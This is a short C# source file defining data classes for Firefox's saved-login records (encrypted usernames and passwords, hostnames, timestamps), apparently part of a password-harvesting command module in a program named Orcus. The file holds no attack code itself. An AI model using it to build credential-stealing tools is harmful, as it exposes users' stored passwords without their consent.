// ReSharper disable InconsistentNaming
namespace Orcus.Commands.Passwords.Applications.Mozilla
{
    public class FirefoxLogins
    {
        public long nextId;
        public LoginData[] logins;
        public string[] disabledHosts;
        public int version;
    }

    public class LoginData
    {
        public string encryptedPassword;
        public string encryptedUsername;
        public int encType;
        public string formSubmitURL;
        public string guid;
        public string hostname;
        public string httprealm;
        public long id;
        public string passwordField;
        public long timeCreated;
        public long timeLastUsed;
        public long timePasswordChanged;
        public long timesUsed;
        public string url;
        public string usernameField;
    }
}